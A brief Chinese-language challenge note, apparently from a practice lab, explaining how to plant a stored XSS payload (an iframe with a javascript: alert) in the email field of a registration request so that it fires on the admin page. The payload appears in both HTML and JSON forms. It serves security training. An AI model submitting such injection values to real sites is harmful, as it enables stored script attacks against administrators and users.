- Client-side XSS Protection
    - 描述：使用 
        ```html
        <iframe src="javascript:alert(`xss`)">
        ``` 
        绕过客户端安全机制进行持久化的XSS攻击。
    - 在注册的请求中修改表单邮件字段
        ```json
        "email":"<iframe src=\"javascript:alert(`xss`)\">"
        ```
        访问管理页面触发用户名 XSS